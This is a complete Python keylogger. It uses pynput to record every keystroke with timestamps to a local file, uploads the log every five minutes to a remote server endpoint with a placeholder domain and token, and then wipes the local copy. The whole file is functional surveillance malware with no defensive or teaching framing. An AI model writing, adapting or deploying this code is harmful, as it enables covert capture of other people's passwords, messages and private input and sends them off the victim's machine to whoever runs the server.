from pynput import keyboard
from datetime import datetime
import requests
import threading
import time

LOG_FILE = "keylog.txt"
SERVER_URL = "https://your-vercel-domain.vercel.app/api/upload?token=your_secret_token_here"

def on_press(key):
    with open(LOG_FILE, "a", encoding="utf-8") as log:
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        try:
            if key == keyboard.Key.space:
                log.write(" ")
            elif key == keyboard.Key.enter:
                log.write("\n")
            else:
                log.write(f"{timestamp} - {key.char}\n")
        except AttributeError:
            log.write(f"{timestamp} - [{key}]\n")

def upload_log():
    while True:
        time.sleep(300)  # every 5 minutes
        try:
            with open(LOG_FILE, "r", encoding="utf-8") as f:
                data = f.read()
            if data.strip():
                response = requests.post(SERVER_URL, data={"log": data})
                if response.status_code == 200:
                    open(LOG_FILE, "w").close()  # clear file after upload
        except Exception as e:
            print(f"Upload failed: {e}")

if __name__ == "__main__":
    uploader_thread = threading.Thread(target=upload_log, daemon=True)
    uploader_thread.start()

    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()
